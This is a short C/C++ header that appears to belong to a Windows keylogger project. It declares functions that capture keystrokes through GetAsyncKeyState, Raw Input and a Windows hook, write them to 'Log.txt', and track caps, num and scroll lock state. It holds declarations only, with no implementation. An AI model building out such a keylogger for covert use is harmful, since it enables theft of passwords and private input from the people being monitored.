#include <stdio.h>
#include <Windows.h>

#pragma warning (disable : 4996)

extern bool caps, numLk, scrLk;

void KeyLogger_GetAsyncKeyState();
void KeyLogger_RawInput();
void KeyLogger_SetWindowsHook();
void Log(char* input, const char fileName[] = "Log.txt");
bool LogKey(int key);

